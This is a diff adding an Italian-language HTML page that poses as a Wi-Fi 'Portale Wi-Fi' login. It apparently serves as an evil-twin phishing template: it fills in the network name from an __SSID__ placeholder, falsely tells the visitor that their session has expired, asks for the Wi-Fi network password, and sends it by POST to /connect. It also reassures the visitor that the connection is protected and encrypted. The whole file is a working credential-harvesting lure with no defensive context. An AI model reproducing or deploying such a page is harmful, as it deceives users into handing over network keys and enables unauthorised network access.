@@ -1,0 +1,59 @@
+<!DOCTYPE html>
+<html lang="it">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1">
+    <title>Autenticazione Wi-Fi</title>
+    <style>
+        *{margin:0;padding:0;box-sizing:border-box}
+        body{font-family:Arial,Helvetica,sans-serif;background:#eef1f7;min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:16px}
+        header{margin-bottom:18px;text-align:center}
+        header span{font-size:20px;font-weight:700;color:#0055b3;letter-spacing:-.3px}
+        header small{display:block;font-size:11px;color:#888;margin-top:2px}
+        .card{background:#fff;border:1px solid #d8dde8;border-radius:6px;padding:28px 24px;max-width:380px;width:100%;box-shadow:0 2px 6px rgba(0,0,0,.07)}
+        .icon{text-align:center;margin-bottom:14px}
+        h1{font-size:16px;color:#1a1a1a;text-align:center;margin-bottom:6px;font-weight:700}
+        .ssid-row{text-align:center;margin-bottom:14px}
+        .ssid{display:inline-block;background:#f0f5ff;border:1px solid #bfd0f5;border-radius:3px;padding:3px 10px;font-size:14px;font-weight:700;color:#0044aa;max-width:100%;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+        .msg{font-size:12px;color:#555;line-height:1.55;margin-bottom:18px;text-align:center;border-top:1px solid #eee;padding-top:14px}
+        label{display:block;font-size:11px;font-weight:700;color:#333;margin-bottom:4px;text-transform:uppercase;letter-spacing:.4px}
+        input[type=password]{width:100%;padding:10px 11px;border:1px solid #ccc;border-radius:4px;font-size:14px;color:#222;outline:none;margin-bottom:14px}
+        input[type=password]:focus{border-color:#0055b3;box-shadow:0 0 0 2px rgba(0,85,179,.1)}
+        button{width:100%;padding:11px;background:#0055b3;color:#fff;border:none;border-radius:4px;font-size:14px;font-weight:700;cursor:pointer}
+        button:hover{background:#004499}
+        .note{font-size:11px;color:#888;margin-top:12px;text-align:center;line-height:1.5}
+        footer{margin-top:20px;font-size:10px;color:#aaa;text-align:center}
+        footer a{color:#0055b3;text-decoration:none}
+    </style>
+</head>
+<body>
+    <header>
+        <span>&#x1F4F6;&nbsp;Portale Wi-Fi</span>
+        <small>Accesso sicuro alla rete</small>
+    </header>
+    <div class="card">
+        <div class="icon">
+            <svg width="50" height="38" viewBox="0 0 50 38" fill="none">
+                <path d="M1 13C9 4 17 0 25 0s16 4 24 13" stroke="#0055b3" stroke-width="3" stroke-linecap="round"/>
+                <path d="M7 20C13 13 19 10 25 10s12 3 18 10" stroke="#0055b3" stroke-width="3" stroke-linecap="round"/>
+                <path d="M13 27c4-5 8-7 12-7s8 2 12 7" stroke="#0055b3" stroke-width="3" stroke-linecap="round"/>
+                <circle cx="25" cy="35" r="3" fill="#0055b3"/>
+            </svg>
+        </div>
+        <h1>Autenticazione richiesta</h1>
+        <div class="ssid-row">
+            <span class="ssid">__SSID__</span>
+        </div>
+        <p class="msg">La tua sessione &egrave; scaduta o il dispositivo deve essere autenticato.<br>Inserisci la password della rete Wi-Fi per continuare.</p>
+        <form action="/connect" method="POST">
+            <label>Password Wi-Fi</label>
+            <input type="password" name="p" placeholder="Chiave di rete" required autofocus>
+            <button type="submit">Accedi alla rete</button>
+            <p class="note">La connessione &egrave; protetta e crittografata.</p>
+        </form>
+    </div>
+    <footer>
+        <a href="#">Termini di utilizzo</a> &bull; <a href="#">Privacy</a> &bull; &copy; Portale Wi-Fi
+    </footer>
+</body>
+</html>
